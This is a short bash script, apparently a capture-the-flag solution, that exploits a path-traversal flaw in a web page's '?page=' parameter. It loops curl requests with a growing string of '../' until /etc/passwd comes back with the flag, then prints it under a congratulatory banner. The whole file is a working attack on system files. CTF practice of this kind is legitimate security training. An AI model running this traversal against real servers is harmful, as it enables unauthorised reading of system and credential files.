#!/bin/bash

url="http://$IP_ADDRESS/?page="
path=""
response=$(curl -s "$url$path/etc/passwd")

while [[ ! $response =~  "The flag is" ]]; do
    path+="../"
    response=$(curl -s "${url}${path}etc/passwd")
    echo "Nothing found at ${url}${path}etc/passwd"
    echo
done

echo -e "\e[32mVulnerable path found: ${url}${path}etc/passwd\e[0m"

figlet YES YOU DID IT CLEM AND MAT !

echo "Here below the response containing the flag:"
echo
echo "$response"

